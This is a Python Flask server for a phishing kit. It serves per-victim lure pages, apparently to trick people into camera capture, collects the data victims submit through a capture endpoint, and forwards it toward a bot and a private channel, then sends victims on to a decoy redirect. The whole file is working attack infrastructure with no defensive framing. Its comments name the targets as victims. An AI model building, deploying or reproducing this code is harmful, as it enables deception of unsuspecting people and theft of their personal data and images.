from flask import Flask, request, jsonify
import requests
import os
import base64
import time
import threading
from config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL

app = Flask(__name__)

# In-memory storage
victim_data = {}
user_redirects = {}
user_photos = {}

# ========== SERVE PHISHING PAGE ==========
@app.route('/p/<uid>')
def phishing_page(uid):
    target_type = request.args.get('type', 'cam')
    victim_id = request.args.get('v', 'unknown')
    redirect_url = user_redirects.get(victim_id, 'https://google.com')
    
    # Get photo URL for this victim
    photo_url = user_photos.get(victim_id, 'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=No+Photo')
    
    with open('web/index.html', 'r') as f:
        html = f.read()
    
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    html = html.replace('{{PHOTO_URL}}', photo_url)
    return html

# ========== STORE PHOTO ==========
@app.route('/store_photo/<victim_id>', methods=['POST'])
def store_photo(victim_id):
    data = request.json
    if data and data.get('photo_url'):
        user_photos[victim_id] = data['photo_url']
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ========== SET REDIRECT ==========
@app.route('/set_redirect/<victim_id>', methods=['POST'])
def set_redirect(victim_id):
    url = request.json.get('url')
    if url and url.startswith('http'):
        user_redirects[victim_id] = url
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ========== CAPTURE DATA ==========
@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    victim_id = data.get('victim_id')
    if not victim_id:
        return jsonify({"status": "error"}), 400
    
    victim_data[victim_id] = data
    victim_data[victim_id]["time"] = time.time()
    
    # Forward to bot (which forwards to user + channel)
    forward_to_bot(data)
    return jsonify({"status": "ok"})

def forward_to_bot(data):
    """Trigger bot's forward function via API"""
    try:
        # Send a message to bot to forward data
        # We'll use the bot's send_message to trigger
        victim_id = data.get('victim_id')
        # Store in a queue and bot will pick up
        # Or directly call the function if bot is in same process
        # Since we can't import bot here, we'll use webhook
        requests.post(f"{BASE_URL}/trigger_forward", json=data, timeout=5)
    except Exception as e:
        print(f"Forward trigger error: {e}")

# ========== TRIGGER FORWARD (called by bot) ==========
@app.route('/trigger_forward', methods=['POST'])
def trigger_forward():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    victim_id = data.get('victim_id')
    if victim_id and victim_id in victim_data:
        # Bot will pick this up
        pass
    
    return jsonify({"status": "ok"})

# ========== AUTO-DELETE OLD DATA ==========
def clean_old_data():
    while True:
        time.sleep(600)
        current_time = time.time()
        to_delete = []
        for key, val in victim_data.items():
            if current_time - val.get("time", 0) > 600:
                to_delete.append(key)
        for key in to_delete:
            del victim_data[key]
            if key in user_photos:
                del user_photos[key]
            if key in user_redirects:
                del user_redirects[key]
        print(f"🧹 Deleted {len(to_delete)} old victim data")

threading.Thread(target=clean_old_data, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
